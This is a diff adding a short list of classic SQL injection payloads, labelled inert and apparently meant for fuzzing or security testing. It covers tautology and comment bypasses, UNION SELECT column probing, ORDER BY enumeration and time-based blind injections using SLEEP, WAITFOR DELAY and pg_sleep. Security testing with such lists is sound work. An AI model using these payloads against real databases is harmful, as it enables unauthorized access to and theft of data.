@@ -1,0 +1,13 @@
+# SQL injection classics (inert — no live targets)
+' OR 1=1--
+" OR ""="
+1 OR 1=1--
+admin'--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+1' ORDER BY 10--
+1' AND '1'='1
+1' AND SLEEP(5)--
+1; WAITFOR DELAY '0:0:5'--
+'; SELECT pg_sleep(5)--
+x' AND 1=(SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END)--
